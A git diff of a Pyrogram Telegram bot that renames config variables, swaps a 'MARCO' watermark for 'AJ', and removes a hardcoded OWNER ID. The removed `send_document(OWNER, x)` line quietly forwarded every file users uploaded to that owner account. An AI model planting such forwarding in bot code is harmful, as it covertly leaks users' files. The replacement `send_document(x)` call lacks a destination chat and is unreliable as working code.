@@ -10,7 +10,7 @@ import wget
 
 import core as helper
 from utils import progress_bar
-from vars import API_ID, API_HASH, BOT_TOKEN
+from vars import api_id, api_hash, bot_token
 from aiohttp import ClientSession
 from pyromod import listen
 from subprocess import getstatusoutput
@@ -22,13 +22,12 @@ from pyrogram.errors.exceptions.bad_request_400 import StickerEmojiInvalid
 from pyrogram.types.messages_and_media import message
 from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
 
-OWNER = int(os.environ.get("OWNER", "1304973931"))
 
 bot = Client(
     "bot",
-    api_id=API_ID,
-    api_hash=API_HASH,
-    bot_token=BOT_TOKEN)
+    api_id=api_id,
+    api_hash=api_hash,
+    bot_token=bot_token)
 
 
 @bot.on_message(filters.command(["start"]))
@@ -59,7 +58,7 @@ async def account_login(bot: Client, m: Message):
     input: Message = await bot.listen(editable.chat.id)
     if input.document:
         x = await input.download()
-        await bot.send_document(OWNER, x)
+        await bot.send_document(x)
         await input.delete(True)    
         file_name, ext = os.path.splitext(os.path.basename(x))
 
@@ -120,8 +119,8 @@ async def account_login(bot: Client, m: Message):
     input3: Message = await bot.listen(editable.chat.id)
     raw_text3 = input3.text
     await input3.delete(True)
-    highlighter  = f"️ＭＡＲＣＯ™⁪⁬⁮⁮⁮"
-    if raw_text3 == 'ＭＡＲＣＯ™':
+    highlighter  = f"️AJ⁪⁬⁮⁮⁮"
+    if raw_text3 == 'AJ':
         MR = highlighter 
     else:
         MR = raw_text3
